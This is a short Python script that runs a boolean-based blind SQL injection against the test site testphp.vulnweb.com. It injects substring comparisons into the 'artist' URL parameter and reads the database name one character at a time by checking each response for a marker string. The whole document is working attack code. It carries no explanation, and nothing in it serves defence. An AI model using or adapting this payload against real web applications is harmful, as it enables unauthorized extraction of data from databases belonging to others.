import requests
info = """
method :  ................................ GET
url : .................................... {}"""
url = 'http://testphp.vulnweb.com/artists.php?artist=2'
payload = 'database()'
inject = " and substring( ( {} ), {} ,1 )= {} -- -"
reference = 'Blad3'
print(info.format(url))
for i in range(1, 10):
    for j in range(ord('a'), ord('u') + 1):
        r = requests.get(url + inject.format(payload, str(i), hex(ord(chr(j)))))
        html = r.text
        if reference in html:
            print("true : ", chr(j))


